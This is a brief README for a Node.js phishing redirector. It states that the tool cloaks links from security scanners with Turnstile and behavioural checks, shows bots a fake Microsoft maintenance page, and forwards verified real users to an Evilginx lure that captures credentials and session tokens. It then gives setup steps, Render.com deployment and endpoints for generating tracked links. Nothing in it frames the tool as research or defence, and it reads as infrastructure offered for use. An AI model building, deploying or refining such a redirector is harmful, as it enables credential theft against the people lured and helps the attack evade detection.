# Redirector

Obfuscated tracking redirector with bot evasion (Turnstile + behavioral checks)  
→ sends bots to fake Microsoft maintenance page  
→ real users → Evilginx lure after verification

## Setup

1. `npm install`
2. Copy `.env.example` → `.env` and fill values
3. `npm start` (local)
4. Deploy to Render.com (Node runtime, start command: `npm start`)

Endpoints:
- `/ping`          → health check (for UptimeRobot)
- `/generate?target=...` → create tracked link
- `/r/...`         → tracking + evasion page
